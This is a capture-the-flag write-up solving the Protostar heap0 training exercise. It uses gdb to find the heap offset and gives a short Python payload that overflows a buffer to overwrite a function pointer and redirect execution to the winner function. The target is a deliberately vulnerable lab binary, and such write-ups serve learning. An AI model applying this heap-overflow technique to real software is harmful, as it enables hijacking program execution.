### S0lv3d by H4yicl3

link https://exploit-exercises.com/protostar/heap0/

compile source c
```
gcc -o heap0 heap0.c
./heap0 <argv[1]>
```

create breakpoint and see the heap in the gdb
```asm
0x0804853c <+103>:   mov    eax,DWORD PTR [esp+0x18]

b *0x0804853c
r AAAAAAAAAAAAAA
x/40wx 0x804b000

0x804b000:      0x00000000      0x00000049      0x41414141      0x41414141
0x804b010:      0x41414141      0x00004141      0x00000000      0x00000000
0x804b020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804b050:      0x080484c1      0x00000000      0x00000000      0x00020fa9
```

so we see the address of nowinner
```
gdb-peda$ p nowinner
$1 = {<text variable, no debug info>} 0x80484c1 <nowinner>
gdb-peda$ x/wx 0x804b050
0x804b050:      0x080484c1
```

ok !! now we know the address of f->fp = nowinner
we need to change it become f->fp = winner 
so it will run the winner instead of nowinner

the start of heap we can write is 0x804b008
we need change address at 0x804b050
so the offset is 0x50-0x08 = 0x48 =72

the winner address 
```
gdb-peda$ p winner
$2 = {<text variable, no debug info>} 0x80484ad <winner>
```

the python code look like
```
padding ="A"*0x48
padding +="\xad\x84\x04\x08"
print padding
```

try to run this
```
hayicle@ubuntu:~/ctf/protostar/heap$ ./heap0 $(cat input)
data is at 0x804b008 , fp is at 0x804b050 
i am hayicle
```


g00d luck!
